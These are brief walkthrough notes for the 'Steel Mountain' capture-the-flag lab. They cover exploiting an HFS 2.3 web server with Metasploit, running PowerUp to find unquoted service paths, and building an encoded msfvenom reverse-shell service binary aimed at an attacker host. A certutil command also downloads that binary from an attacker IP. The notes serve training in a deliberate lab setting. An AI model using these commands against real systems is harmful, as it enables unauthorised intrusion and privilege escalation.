# Steel Mountain

- run an nmap scan
- find out the web ports (80,8080)
- you will find bill harper user
- on 8080, HttpWebServer 2.3 app will be running and it is a HFS app which will be vulnerable, you can exploit it with metasploit
- just search the exploit modules with `search -type exploit HFS` or `searchsploit -s HttpWebServer 2.3`
- You will get a shell
- Invoke powershell in metasploit with `load powershell` and `powershell_shell` commands
- upload `https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1` & run it
- followed by `Invoke-AllChecks` command and this will reveal services which have unquoted-service-path vulns
- then generate payload with msfvenom - `msfvenom -p windows/shell_reverse_tcp LHOSTS=<attacker-host> LPORT=<attacker-port> -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
- once you upload the payload into the path where the service has this vulnerability and invoke the `net stop;net start` commands you will get a reverse shell with the user SYSTEM`

- from CMD.exe you can run the following command to access a web-server `certutil -urlcache -f http://10.18.112.115/Advanced.exe Advanced.exe`



## References
- https://www.hackingarticles.in/windows-privilege-escalation-unquoted-service-path/
- https://infosecwriteups.com/tryhackme-writeup-steel-mountain-d052141f8901
- https://www.exploit-db.com/exploits/39161
- https://www.mandiant.com/resources/shikata-ga-nai-encoder-still-going-strong
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
- https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe
- 
